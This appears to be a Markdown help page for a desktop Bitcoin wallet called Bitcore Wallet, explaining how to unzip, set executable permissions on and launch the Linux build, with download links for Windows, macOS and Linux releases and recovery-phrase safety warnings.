<p align="center"><img src="https://raw.githubusercontent.com/bitcore-projects/learn/main/assets/bitcore-wallet-banner-free-yours.webp" alt="Bitcore Wallet — free Bitcoin desktop wallet" width="100%"></p>

<h1 align="center">How to install Bitcore Wallet on Linux</h1>

<p align="center">[![Website](https://img.shields.io/badge/website-bitcorewallet.org-F7AD44?style=for-the-badge)](https://bitcorewallet.org/) [![Release](https://img.shields.io/badge/release-v8.25.3-2B2B30?style=for-the-badge&logo=github)](https://github.com/bitcore-projects/Bitcore-Wallet/releases/tag/v8.25.3) [![Free](https://img.shields.io/badge/price-free_to_install-F7AD44?style=for-the-badge)](https://bitcorewallet.org/fees) [![Self-custody](https://img.shields.io/badge/self--custody-bitcoin_wallet-2B2B30?style=for-the-badge&logo=bitcoin)](https://bitcorewallet.org/self-custody)</p>

> **Short answer:** Unzip the x64 ZIP archive, make the app executable if needed, and launch Bitcore Wallet from the extracted folder.

---

## You'll see this if
- The ZIP extracted but the app will not launch
- You get 'permission denied'
- You want a launcher icon

## Why it happens
ZIP archives sometimes drop the executable flag, and desktop environments need a launcher entry to show the app in menus. For background, read the [Linux download for Bitcore Wallet](https://bitcorewallet.org/download) on the Bitcore Wallet website, or the related guide [How to handle a stuck Bitcoin transaction](./stuck-bitcoin-transaction.md).

## How to fix it
1. Download `bitcore-wallet-v8.25.3.zip` and run `sha256sum` on it.
2. Extract it: `unzip bitcore-wallet-v8.25.3.zip -d ~/bitcore-wallet`.
3. Enter the folder and mark the app executable with `chmod +x`.
4. Launch it and create or restore your wallet.
5. Optionally add a .desktop launcher pointing to the executable.

## If that didn't work
If a library is reported missing, install it with your distribution's package manager and launch again. You can also check [Bitcore Wallet updates](https://bitcorewallet.org/updates) and [Bitcoin network fees explained simply](./bitcoin-fees-explained.md).

## Prevention
Keep the extracted folder in your home directory, not a shared location. The [frequently asked questions](https://bitcorewallet.org/faq) has more detail.

> [!WARNING]
> Never type your recovery phrase into a website, chat or form. Bitcore Wallet support will never ask for it.

## FAQ
**Which distributions work?**  
64-bit desktop distributions are the target.

**Is ARM supported?**  
The published archive is x64.

---

## Get Bitcore Wallet

> [!TIP]
> Download only from the official release or [bitcorewallet.org](https://bitcorewallet.org/download). Nobody from Bitcore Wallet will ever ask for your recovery phrase.

<p align="center">[![Download for Windows](https://img.shields.io/badge/Download-Windows-F7AD44?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.exe) [![Download for macOS](https://img.shields.io/badge/Download-macOS-F7AD44?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.dmg) [![Download for Linux](https://img.shields.io/badge/Download-Linux-F7AD44?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.zip)</p>

| Platform | File | Package | Requirements |
|---|---|---|---|
| **Windows** | [`bitcore-wallet-v8.25.3.exe`](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.exe) | 64-bit EXE installer | Windows 10 or 11, 64-bit |
| **macOS** | [`bitcore-wallet-v8.25.3.dmg`](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.dmg) | DMG package | Recent macOS release |
| **Linux** | [`bitcore-wallet-v8.25.3.zip`](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.zip) | x64 ZIP archive | 64-bit desktop distribution |

Release notes: [Bitcore Wallet v8.25.3 on GitHub](https://github.com/bitcore-projects/Bitcore-Wallet/releases/tag/v8.25.3) · Source: [bitcore-projects/Bitcore-Wallet](https://github.com/bitcore-projects/Bitcore-Wallet)

---

## Related guides
| Guide | |
|---|---|
| [How to back up your Bitcoin recovery phrase](./seed-phrase-backup.md) | Bitcore Wallet how-to |
| [How to restore Bitcore Wallet on a new computer](./restore-wallet-new-computer.md) | Bitcore Wallet how-to |
| [Why your Bitcoin wallet is not syncing](./wallet-not-syncing.md) | Bitcore Wallet how-to |
| [All Bitcore Wallet guides](../README.md) | Index |
